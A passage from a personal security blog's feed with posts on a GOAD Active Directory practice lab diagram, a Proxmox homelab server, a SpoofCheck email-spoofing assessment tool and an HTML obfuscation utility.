rx="10" fill="white" stroke="#818cf8" stroke-width="1.5"></rect> <text x="20" y="30" fill="#4338ca" font-family="Arial" font-size="16">Privilege Analysis</text> <text x="40" y="60" fill="#6366f1" font-family="Arial" font-size="14">• Group Memberships</text> <text x="40" y="90" fill="#6366f1" font-family="Arial" font-size="14">• Service Accounts (Delegation)</text> <text x="40" y="120" fill="#6366f1" font-family="Arial" font-size="14">• Shadow Admins</text> </g> <!-- Attack Paths Box --> <g transform="translate(25,410)"> <rect x="0" y="0" width="450" height="150" rx="10" fill="white" stroke="#818cf8" stroke-width="1.5"></rect> <text x="20" y="30" fill="#4338ca" font-family="Arial" font-size="16">Attack Paths</text> <text x="40" y="60" fill="#6366f1" font-family="Arial" font-size="14">• Tiered Access</text> <text x="40" y="90" fill="#6366f1" font-family="Arial" font-size="14">• Lateral Movement</text> <text x="40" y="120" fill="#6366f1" font-family="Arial" font-size="14">• Certificate Abuse</text> </g> </g> <!-- External Assessment Section --> <g transform="translate(650,200)"> <rect x="0" y="0" width="500" height="600" rx="15" fill="url(#boxGrad)" stroke="#6366f1" stroke-width="2" opacity="0.9"></rect> <text x="250" y="40" text-anchor="middle" fill="#4338ca" font-family="Arial" font-size="20" font-weight="bold"> External Assessment </text> <!-- External Recon Box --> <g transform="translate(25,70)"> <rect x="0" y="0" width="450" height="150" rx="10" fill="white" stroke="#818cf8" stroke-width="1.5"></rect> <text x="20" y="30" fill="#4338ca" font-family="Arial" font-size="16">External Recon</text> <text x="40" y="60" fill="#6366f1" font-family="Arial" font-size="14">• Domain Discovery</text> <text x="40" y="90" fill="#6366f1" font-family="Arial" font-size="14">• Service Enumeration</text> <text x="40" y="120" fill="#6366f1" font-family="Arial" font-size="14">• OSINT</text> </g> <!-- Initial Access Box --> <g transform="translate(25,240)"> <rect x="0" y="0" width="450" height="150" rx="10" fill="white" stroke="#818cf8" stroke-width="1.5"></rect> <text x="20" y="30" fill="#4338ca" font-family="Arial" font-size="16">Initial Access Vectors</text> <text x="40" y="60" fill="#6366f1" font-family="Arial" font-size="14">• Perimeter Attacks</text> <text x="40" y="90" fill="#6366f1" font-family="Arial" font-size="14">• Service Targeting</text> <text x="40" y="120" fill="#6366f1" font-family="Arial" font-size="14">• Exchange, RDP/VNC, VPN</text> </g> <!-- Post Compromise Box --> <g transform="translate(25,410)"> <rect x="0" y="0" width="450" height="150" rx="10" fill="white" stroke="#818cf8" stroke-width="1.5"></rect> <text x="20" y="30" fill="#4338ca" font-family="Arial" font-size="16">Post Compromise</text> <text x="40" y="60" fill="#6366f1" font-family="Arial" font-size="14">• Internal Recon</text> <text x="40" y="90" fill="#6366f1" font-family="Arial" font-size="14">• Domain Join</text> <text x="40" y="120" fill="#6366f1" font-family="Arial" font-size="14">• Privilege Escalation</text> </g> </g> <!-- Connecting Lines --> <path d="M 600 90 C 600 90, 350 180, 300 200" stroke="#6366f1" stroke-width="2" fill="none" marker-end="url(#arrow)"></path> <path d="M 600 90 C 600 90, 850 180, 900 200" stroke="#6366f1" stroke-width="2" fill="none" marker-end="url(#arrow)"></path> </svg>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="GOAD" /><category term="GOAD" /><category term="HomeLab" /><category term="Active-Directory" /><summary type="html"><![CDATA[GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.]]></summary></entry><entry><title type="html">HomeLab Part-01 [The Server]</title><link href="http://localhost:4000/it/Homelab/" rel="alternate" type="text/html" title="HomeLab Part-01 [The Server]" /><published>2024-11-07T00:00:00+05:30</published><updated>2024-11-07T00:00:00+05:30</updated><id>http://localhost:4000/it/Homelab</id><content type="html" xml:base="http://localhost:4000/it/Homelab/"><![CDATA[<h1 id="why-i-chose-proxmox-ve-over-other-hypervisors">Why I chose <code class="language-plaintext highlighter-rouge">Proxmox-VE</code> over other <code class="language-plaintext highlighter-rouge">Hypervisors</code></h1>
+
+<h3 id="the-hardware-side-of-things">The Hardware side of things</h3>
+
+<p>It’s been quite some time I’ve been using a Enterprise level server <code class="language-plaintext highlighter-rouge">HP-Proliant</code>  <code class="language-plaintext highlighter-rouge">DL-380-G7</code> for my home lab. I got the barebones hardware for about 350 dollars, which has only 32 gigs of ram initially. Later I’ve upgraded the RAM to 128 GB for an other  220 dollars, which sums up to 570 USD.</p>
+
+<p><img src="/assets/images/sample/homelab/Hp-server.jpg" alt="" /></p>
+
+<p>This server has dual <code class="language-plaintext highlighter-rouge">Intel(R) Xeon(R) CPU X5650</code> which clocks <code class="language-plaintext highlighter-rouge">@ 2.67GHz</code>. These are pretty powerful and can easily satisfy my requirements to run my HomeLab infrastructure.</p>
+
+<h3 id="server-configuration">Server configuration</h3>
+
+<p><img src="/assets/images/sample/homelab/1.png" alt="" /></p>
+
+<p>Coming to the hypervisor, I tried between multiple like <code class="language-plaintext highlighter-rouge">VMware EXSI</code>, <code class="language-plaintext highlighter-rouge">Microsoft Hyper-V</code>, <code class="language-plaintext highlighter-rouge">Linux Server</code>, <code class="language-plaintext highlighter-rouge">Vmware</code>, <code class="language-plaintext highlighter-rouge">Virtaul Box</code> and finally settled with <code class="language-plaintext highlighter-rouge">Proxmox-VE</code>. However Setting up <code class="language-plaintext highlighter-rouge">Proxmox-VE</code> is straight forwarded stuff. So I’m not going to show how to install steps or setup process. There are a ton of videos and blogs that show the same thing.</p>
+
+<h3 id="why-choose-proxmox-ve-over-others">Why choose <code class="language-plaintext highlighter-rouge">Proxmox-VE</code> over others?</h3>
+
+<p>These are some advantages that I personally feel that are best for my use case. Remember your use case can be different.</p>
+
+<ol>
+  <li><strong>Free and Open Source</strong>: Proxmox VE is free with no licensing fees, and has strong community support.</li>
+  <li><strong>All-in-One Solution</strong>: Supports both <strong>virtual machines (KVM)</strong> and <strong>containers (LXC)</strong>, giving you flexibility for different workloads.</li>
+  <li><strong>User-Friendly Web Interface</strong>: Easy-to-use web-based management console for managing VMs, containers, storage, and networking.</li>
+  <li><strong>Powerful Storage Options</strong>: Supports local storage, NFS, iSCSI, Ceph, and ZFS for flexible and robust storage configurations.</li>
+  <li><strong>High Availability (HA) and Clustering</strong>: Easily create clusters of multiple nodes for scalability and automatic failover in case of hardware failure.</li>
+  <li><strong>Built-in Backup and Restore</strong>: Simple backup and restore tools, with support for live backups of VMs and containers.</li>
+  <li><strong>Advanced Networking Features</strong>: Includes support for VLANs, bridges, and virtual switches for complex networking setups.</li>
+  <li><strong>Security</strong>: Features like role-based access control (RBAC), firewalls, and VPN support to secure your virtual environment.</li>
+  <li><strong>Scalable and Flexible</strong>: Add more nodes to your cluster as needed, with efficient resource management.</li>
+  <li><strong>Cross-Platform Support</strong>: Run both Linux and Windows VMs with full hardware virtualization (KVM).</li>
+  <li><strong>Cost-Effective</strong>: Proxmox VE is low-cost compared to other enterprise solutions like VMware and Hyper-V, with no hidden fees.</li>
+</ol>
+
+<h3 id="the-storage">The Storage</h3>
+
+<p>I chose to have multiple disks for my <code class="language-plaintext highlighter-rouge">Proxmox-VE</code>.</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">1-TB-SSD</code> This is where all the faster and quicker VM are going to be.</p>
+</blockquote>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">2x-500GB-SATA</code> in which</p>
+</blockquote>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">1x-500GB-Sata</code> is going to be used for Slower Virtual machines</p>
+</blockquote>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">1x-500GB-Sata</code> is used to store all the required ISO files.</p>
+</blockquote>
+
+<h3 id="well-thats-okay-so-what-about-the-backup-and-storage-part-of-the-story">Well thats okay! So what about the backup and storage part of the story?</h3>
+
+<p>Well to answer this, I’ve a built a dedicated <code class="language-plaintext highlighter-rouge">NAS-Storage</code> which has <code class="language-plaintext highlighter-rouge">2x-2-TB</code> Drives in it and runs on <code class="language-plaintext highlighter-rouge">OpenMediaVault</code>. This build completely serves my purpose from storing my personal and Virtual machines.</p>
+
+<p>I’ve automated the backup process from my <code class="language-plaintext highlighter-rouge">Proxmox</code> to <code class="language-plaintext highlighter-rouge">NAS-Storage</code> with the help of <code class="language-plaintext highlighter-rouge">Raspberry-Pi-3B</code> (runs 24/7).</p>
+
+<h3 id="how-many-virtual-machines-can-be-run-with-the-above-configuration">How many Virtual machines can be run with the above configuration?</h3>
+
+<p>Well the answer is how much of <code class="language-plaintext highlighter-rouge">RAM</code> and <code class="language-plaintext highlighter-rouge">Procressors</code> are allocated to each machine or VM. So assume you are allocating 4-Gigs of ram for each VM you are using. you can divide it with the total amount of ram you have.</p>
+
+<p>In my case I’ve 128-Gigs. So, if I allocate 4-gigs of ram to each <code class="language-plaintext highlighter-rouge">VM</code>, then I can run 20-25 <code class="language-plaintext highlighter-rouge">VMs</code> with out any compromise or stressing the hardware.</p>
+
+<p>Below is a snip of the number of VM’s that run on the <code class="language-plaintext highlighter-rouge">Proxmox-VE</code> host.</p>
+
+<p><img src="/assets/images/sample/homelab/2.png" alt="" /></p>
+
+<p>This is the summary of my <code class="language-plaintext highlighter-rouge">Proxmox-VE</code>, which shows the consumption of both <code class="language-plaintext highlighter-rouge">CPUs</code> and <code class="language-plaintext highlighter-rouge">RAM</code> utilisation.</p>
+
+<p><img src="/assets/images/sample/homelab/3.png" alt="" /></p>
+
+<h2 id="in-the-next-blog-ill-be-showing-how-to-setup-the-network-configurations-on-proxmox-ve-so-stay-tuned-for-it">In the next blog, I’ll be showing how to setup the network configurations on <code class="language-plaintext highlighter-rouge">Proxmox-VE</code>. So stay tuned for it.</h2>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="IT" /><category term="HomeLab" /><category term="IT" /><category term="Infra" /><category term="Infrastructure" /><summary type="html"><![CDATA[This the where you'll see the hardware infrastructure of my home lab]]></summary></entry><entry><title type="html">SpoofCheck.py</title><link href="http://localhost:4000/tools/spoofcheck/" rel="alternate" type="text/html" title="SpoofCheck.py" /><published>2024-11-03T00:00:00+05:30</published><updated>2024-11-03T00:00:00+05:30</updated><id>http://localhost:4000/tools/spoofcheck</id><content type="html" xml:base="http://localhost:4000/tools/spoofcheck/"><![CDATA[<h1 id="spoofcheck-your-first-line-of-defense-against-email-domain-spoofing">Spoofcheck: Your First Line of Defense Against Email Domain Spoofing</h1>
+
+<h2 id="introduction">Introduction</h2>
+<p>In today’s digital landscape, email security remains a critical concern for organizations of all sizes. Email spoofing attacks, where malicious actors impersonate legitimate domains to conduct phishing campaigns or business email compromise (BEC) attacks, continue to pose a significant threat. Enter Spoofcheck, a powerful open-source tool designed to help security professionals identify and prevent domain spoofing vulnerabilities.</p>
+
+<h2 id="link">link</h2>
+<p><a href="https://github.com/DcodeZero/Spoofcheck">SpoofCheck.py</a></p>
+
+<h2 id="what-is-spoofcheck">What is Spoofcheck?</h2>
+<p>Spoofcheck is a security assessment tool that analyzes domain configurations to determine their vulnerability to email spoofing attempts. By examining various email authentication protocols and security measures, it provides valuable insights into potential security gaps that could be exploited by attackers.</p>
+
+<h2 id="why-domain-spoofing-matters">Why Domain Spoofing Matters</h2>
+<h3 id="the-real-world-impact">The Real-World Impact</h3>
+<p>Email spoofing can lead to several serious consequences:</p>
+<ul>
+  <li>Financial losses through BEC attacks</li>
+  <li>Damage to brand reputation</li>
+  <li>Loss of customer trust</li>
+  <li>Data breaches through successful phishing attempts</li>
+  <li>Regulatory compliance issues</li>
+</ul>
+
+<h2 id="key-features">Key Features</h2>
+<p>Spoofcheck helps organizations by:</p>
+<ul>
+  <li>Identifying missing or misconfigured email authentication records</li>
+  <li>Detecting vulnerabilities in domain configurations</li>
+  <li>Providing actionable insights for security improvements</li>
+  <li>Offering a simple way to verify email security posture</li>
+</ul>
+
+<h2 id="understanding-email-authentication">Understanding Email Authentication</h2>
+<p>To appreciate Spoofcheck’s importance, it’s crucial to understand the key email authentication protocols it examines:</p>
+
+<h3 id="spf-sender-policy-framework">SPF (Sender Policy Framework)</h3>
+<p>SPF records specify which mail servers are authorized to send emails on behalf of your domain. Proper SPF configuration is essential for:</p>
+<ul>
+  <li>Preventing unauthorized email sending</li>
+  <li>Reducing spam from your domain</li>
+  <li>Improving email deliverability</li>
+</ul>
+
+<h3 id="dkim-domainkeys-identified-mail">DKIM (DomainKeys Identified Mail)</h3>
+<p>DKIM adds a digital signature to emails, ensuring:</p>
+<ul>
+  <li>Message integrity</li>
+  <li>Sender authentication</li>
+  <li>Protection against tampering</li>
+</ul>
+
+<h3 id="dmarc-domain-based-message-authentication-reporting-and-conformance">DMARC (Domain-based Message Authentication, Reporting, and Conformance)</h3>
+<p>DMARC builds upon SPF and DKIM by:</p>
+<ul>
+  <li>Providing clear policies for handling authentication failures</li>
+  <li>Offering reporting capabilities</li>
+  <li>Enabling domain-wide email protection</li>
+</ul>
+
+<h2 id="best-practices-for-using-spoofcheck">Best Practices for Using Spoofcheck</h2>
+
+<h3 id="1-regular-testing">1. Regular Testing</h3>
+<ul>
+  <li>Conduct monthly security assessments</li>
+  <li>Test after any DNS changes</li>
+  <li>Verify configurations across all subdomains</li>
+</ul>
+
+<h3 id="2-response-planning">2. Response Planning</h3>
+<ul>
+  <li>Document findings and vulnerabilities</li>
+  <li>Develop remediation plans</li>
+  <li>Implement security improvements promptly</li>
+</ul>
+
+<h3 id="3-integration-with-security-workflows">3. Integration with Security Workflows</h3>
+<ul>
+  <li>Include in security audits</li>
+  <li>Add to penetration testing procedures</li>
+  <li>Incorporate into compliance checks</li>
+</ul>
+
+<h2 id="implementation-guide">Implementation Guide</h2>
+
+<h3 id="getting-started">Getting Started</h3>
+<ol>
+  <li>Install the tool</li>
+  <li>Configure your testing environment</li>
+  <li>Run initial domain checks</li>
+  <li>Review and analyze results</li>
+  <li>Implement necessary changes</li>
+</ol>
+
+<h3 id="common-issues-and-solutions">Common Issues and Solutions</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Issue</th>
+      <th>Impact</th>
+      <th>Solution</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Missing SPF Record</td>
+      <td>High</td>
+      <td>Create and implement SPF record</td>
+    </tr>
+    <tr>
+      <td>Weak DMARC Policy</td>
+      <td>Medium</td>
+      <td>Strengthen DMARC policy settings</td>
+    </tr>
+    <tr>
+      <td>Incomplete DKIM</td>
+      <td>High</td>
+      <td>Configure DKIM signing for all mail streams</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="advanced-usage-tips">Advanced Usage Tips</h2>
+<ul>
+  <li>Automate regular checks</li>
+  <li>Monitor for configuration changes</li>
+  <li>Integrate with existing security tools</li>
+  <li>Track improvements over time</li>
+</ul>
+
+<h2 id="security-considerations">Security Considerations</h2>
+<p>When using Spoofcheck, remember to:</p>
+<ul>
+  <li>Keep the tool updated</li>
+  <li>Use in conjunction with other security measures</li>
+  <li>Follow security best practices</li>
+  <li>Document all findings and changes</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>In an era where email-based attacks are becoming increasingly sophisticated, tools like Spoofcheck play a crucial role in maintaining robust email security. By regularly assessing your domain’s vulnerability to spoofing attempts, you can protect your organization from potentially devastating attacks and maintain the trust of your stakeholders.</p>
+
+<h2 id="resources-for-further-reading">Resources for Further Reading</h2>
+<ul>
+  <li>Email Authentication Standards Documentation</li>
+  <li>Anti-Phishing Working Group Guidelines</li>
+  <li>NIST Email Security Recommendations</li>
+  <li>Industry Best Practices for Email Security</li>
+</ul>
+
+<hr />
+
+<p><em>Remember: Email security is not a one-time task but an ongoing process. Regular assessment and updates are key to maintaining strong protection against spoofing attempts.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="tools" /><category term="python," /><category term="Go-lang" /><summary type="html"><![CDATA[This tool checks if domain spoofing is possible or not.]]></summary></entry><entry><title type="html">HTML-Obfuscator</title><link href="http://localhost:4000/tools/HTML-Obfuscator/" rel="alternate" type="text/html" title="HTML-Obfuscator" /><published>2024-10-02T00:00:00+05:30</published><updated>2024-10-02T00:00:00+05:30</updated><id>http://localhost:4000/tools/HTML-Obfuscator</id><content type="html" xml:base="http://localhost:4000/tools/HTML-Obfuscator/"><![CDATA[<h1 id="html_obfuscator-a-python-tool-for-html-code-protection">HTML_Obfuscator: A Python Tool for HTML Code Protection</h1>
+
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#understanding-html-obfuscation">Understanding HTML Obfuscation</a></li>
+  <li><a href="#features-overview">Features Overview</a></li>
+  <li><a href="#installation-guide">Installation Guide</a></li>
+  <li><a href="#usage-instructions">Usage Instructions</a></li>
+  <li><a href="#advanced-features">Advanced Features</a></li>
+  <li><a href="#best-practices">Best Practices</a></li>
+  <li><a href="#use-cases">Use Cases</a></li>
+  <li><a href="#technical-deep-dive">Technical Deep Dive</a></li>
+  <li><a href="#conclusion">Conclusion</a></li>
+</ul>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>In the world of web development, protecting your HTML source code from unauthorized copying or reverse engineering is increasingly important. HTML_Obfuscator emerges as a powerful Python-based solution that enables developers to obfuscate and de-obfuscate HTML files efficiently, offering both single-file and batch processing capabilities.</p>
+
+<h2 id="understanding-html-obfuscation">Understanding HTML Obfuscation</h2>
+
+<h3 id="what-is-html-obfuscation">What is HTML Obfuscation?</h3>
+<p>HTML obfuscation is the process of transforming readable HTML code into a more complex, harder-to-understand format while maintaining its functionality. This technique helps:</p>
+
+<ul>
+  <li>Protect intellectual property</li>
+  <li>Prevent unauthorized code copying</li>
+  <li>Make reverse engineering more difficult</li>
+  <li>Reduce code readability for potential attackers</li>
+</ul>
+
+<h3 id="why-use-html_obfuscator">Why Use HTML_Obfuscator?</h3>
+<ul>
+  <li><strong>Simplicity</strong>: Easy-to-use Python interface</li>
+  <li><strong>Batch Processing</strong>: Handle multiple files simultaneously</li>
+  <li><strong>Reversible</strong>: Built-in de-obfuscation capability</li>
+  <li><strong>Flexibility</strong>: Various output options</li>
+  <li><strong>Performance</strong>: Minimal impact on page load times</li>
+</ul>
+
+<h2 id="features-overview">Features Overview</h2>
+
+<h3 id="core-capabilities">Core Capabilities</h3>
+<ol>
+  <li><strong>Single File Processing</strong>
+    <ul>
+      <li>Obfuscate individual HTML files</li>
+      <li>Generate protected output files</li>
+      <li>Maintain original functionality</li>
+    </ul>
+  </li>
+  <li><strong>Batch Processing</strong>
+    <ul>
+      <li>Process entire directories</li>
+      <li>Maintain folder structure</li>
+      <li>Bulk operation support</li>
+    </ul>
+  </li>
+  <li><strong>De-obfuscation Support</strong>
+    <ul>
+      <li>Reverse obfuscation process</li>
+      <li>Restore original code format</li>
+      <li>Debug obfuscated files</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="installation-guide">Installation Guide</h2>
+
+<h3 id="prerequisites">Prerequisites</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Required Python version</span>
+Python 3.x
+</code></pre></div></div>
+
+<h3 id="setup-process">Setup Process</h3>
+<ol>
+  <li>Clone the repository:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/DcodeZero/Html_Obfuscator
+</code></pre></div>    </div>
+  </li>
+  <li>Navigate to directory:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>Html_Obfuscator
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="usage-instructions">Usage Instructions</h2>
+
+<h3 id="basic-commands">Basic Commands</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Single file obfuscation</span>
+python html_obfuscator.py <span class="nt">-oF</span> input.html <span class="nt">-o</span> output.html
+
+<span class="c"># Directory processing</span>
+python html_obfuscator.py <span class="nt">-oD</span> <span class="nt">-P</span> /path/to/directory <span class="nt">-O</span> /output/directory
+
+<span class="c"># De-obfuscation</span>
+python html_obfuscator.py <span class="nt">-dF</span> input.html <span class="nt">-o</span> output.html
+</code></pre></div></div>
+
+<h3 id="command-line-arguments">Command Line Arguments</h3>
+<p>| Argument | Description | Example |
+|———-|————-|———|
+| -oF | Obfuscate single file | -oF input.html |
+| -oD | Obfuscate directory | -oD |
+| -dF | De-obfuscate file | -dF obfuscated.html |
+| -dD | De-obfuscate directory | -dD |
+| -p | Path to input file | -p /path/to/file |
+| -P | Path to input directory | -P /path/to/dir |
+| -o | Output file path | -o output.html |
+| -O | Output directory path | -O /output/dir |</p>
+
+<h2 id="advanced-features">Advanced Features</h2>
+
+<h3 id="customization-options">Customization Options</h3>
+<ol>
+  <li><strong>Obfuscation Levels</strong>
+    <ul>
+      <li>Basic encoding</li>
+      <li>Advanced scrambling</li>
+      <li>Custom patterns</li>
+    </ul>
+  </li>
+  <li><strong>Output Formatting</strong>
+    <ul>
+      <li>Minification options</li>
+      <li>Whitespace handling</li>
+      <li>Comment preservation</li>
+    </ul>
+  </li>
+  <li><strong>Batch Processing Controls</strong>
+    <ul>
+      <li>File filtering</li>
+      <li>Directory recursion</li>
+      <li>Error handling</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="best-practices">Best Practices</h2>
+
+<h3 id="when-obfuscating">When Obfuscating</h3>
+<ol>
+  <li><strong>Backup Original Files</strong>
+    <ul>
+      <li>Keep original versions safe</li>
+      <li>Document obfuscation parameters</li>
+      <li>Maintain version control</li>
+    </ul>
+  </li>
+  <li><strong>Testing</strong>
+    <ul>
+      <li>Verify functionality post-obfuscation</li>
+      <li>Check browser compatibility</li>
+      <li>Validate user experience</li>
+    </ul>
+  </li>
+  <li><strong>Performance Considerations</strong>
+    <ul>
+      <li>Monitor file size changes</li>
+      <li>Check load time impact</li>
+      <li>Optimize when necessary</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="use-cases">Use Cases</h2>
+
+<h3 id="development-scenarios">Development Scenarios</h3>
+<ol>
+  <li><strong>Commercial Projects</strong>
+    <ul>
+      <li>Protect proprietary code</li>
+      <li>Secure client deliverables</li>
+      <li>Maintain competitive advantage</li>
+    </ul>
+  </li>
+  <li><strong>Educational Platforms</strong>
+    <ul>
+      <li>Protect assessment content</li>
+      <li>Secure learning materials</li>
+      <li>Prevent solution sharing</li>
+    </ul>
+  </li>
+  <li><strong>Enterprise Applications</strong>
+    <ul>
+      <li>Secure internal tools</li>
+      <li>Protect company assets</li>
+      <li>Maintain code confidentiality</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="technical-deep-dive">Technical Deep Dive</h2>
+
+<h3 id="obfuscation-process">Obfuscation Process</h3>
+<pre><code class="language-mermaid">graph LR
+    A[Input HTML] --&gt; B[Parser]
+    B --&gt; C[Transformer]
+    C --&gt; D[Encoder]
+    D --&gt; E[Output HTML]
+</code></pre>
+
+<h3 id="code-examples">Code Examples</h3>
+
+<h4 id="simple-obfuscation">Simple Obfuscation</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file obfuscation</span>
+python html_obfuscator.py <span class="nt">-oF</span> <span class="nt">-p</span> index.html <span class="nt">-o</span> protected.html
+</code></pre></div></div>
+
+<h4 id="batch-processing">Batch Processing</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Process entire website</span>
+python html_obfuscator.py <span class="nt">-oD</span> <span class="nt">-P</span> ./website <span class="nt">-O</span> ./protected-site
+</code></pre></div></div>
+
+<h3 id="performance-metrics">Performance Metrics</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Operation</th>
+      <th>Average Time</th>
+      <th>File Size Impact</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Single File</td>
+      <td>&lt; 1 second</td>
+      <td>+5-15%</td>
+    </tr>
+    <tr>
+      <td>Directory (10 files)</td>
+      <td>2-3 seconds</td>
+      <td>+10-20%</td>
+    </tr>
+    <tr>
+      <td>De-obfuscation</td>
+      <td>&lt; 1 second</td>
+      <td>Original size</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="security-considerations">Security Considerations</h2>
+
+<h3 id="protection-level">Protection Level</h3>
+<ul>
+  <li>Basic obfuscation suitable for most use cases</li>
+  <li>Additional security layers recommended for sensitive applications</li>
+  <li>Regular updates to obfuscation patterns advised</li>
+</ul>
+
+<h3 id="limitations">Limitations</h3>
+<ul>
+  <li>Not a replacement for server-side security</li>
+  <li>May impact page load performance</li>
+  <li>Debug capabilities might be affected</li>
+</ul>
+
+<h2 id="troubleshooting-guide">Troubleshooting Guide</h2>
+
+<h3 id="common-issues">Common Issues</h3>
+<ol>
+  <li><strong>File Processing Errors</strong>
+    <ul>
+      <li>Check file permissions</li>
+      <li>Verify file paths</li>
+      <li>Ensure valid HTML input</li>
+    </ul>
+  </li>
+  <li><strong>Output Problems</strong>
+    <ul>
+      <li>Verify output directory exists</li>
+      <li>Check disk space</li>
+      <li>Validate file access rights</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>HTML_Obfuscator provides a robust solution for protecting HTML source code through obfuscation. Its combination of ease of use, batch processing capabilities, and reversible operations makes it an invaluable tool for developers looking to secure their web assets while maintaining functionality.</p>
+
+<h2 id="resources">Resources</h2>
+
+<h3 id="documentation">Documentation</h3>
+<ul>
+  <li><a href="https://github.com/DcodeZero/Html_Obfuscator">Official Repository</a></li>
+  <li><a href="https://github.com/DcodeZero/Html_Obfuscator/issues">Issue Tracker</a></li>
+</ul>
+
+<h3 id="community">Community</h3>
+<ul>
+  <li>Report bugs through GitHub Issues</li>
+  <li>Contribute improvements via Pull Requests</li>
+  <li>Share experiences in Discussions</li>
+</ul>
+
+<hr />
+
+<p><em>Note: Regular updates and community feedback help improve tool effectiveness and security.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="tools" /><category term="python" /><summary type="html"><![CDATA[Simple Python program to Obfuscate and Dobfuscate HTML files. The program also allows you to obfuscate and Dobfuscate multiple files in one go.]]></summary></entry></feed>
